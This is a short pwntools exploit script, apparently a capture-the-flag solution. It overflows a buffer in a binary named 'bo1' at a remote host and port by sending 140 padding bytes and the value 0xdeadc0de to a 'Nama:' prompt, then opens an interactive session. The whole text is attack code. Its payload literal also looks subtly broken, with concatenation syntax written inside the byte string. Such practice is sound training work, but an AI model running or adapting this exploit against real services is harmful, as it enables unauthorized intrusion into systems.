from pwn import *
r = process('./bo1')
r = remote('103.13.207.177',20002)
r.sendlineafter(b'Nama:', b'A' * 140 + b'\xde\xc0\xad\xde + \x00*5')
r.interactive()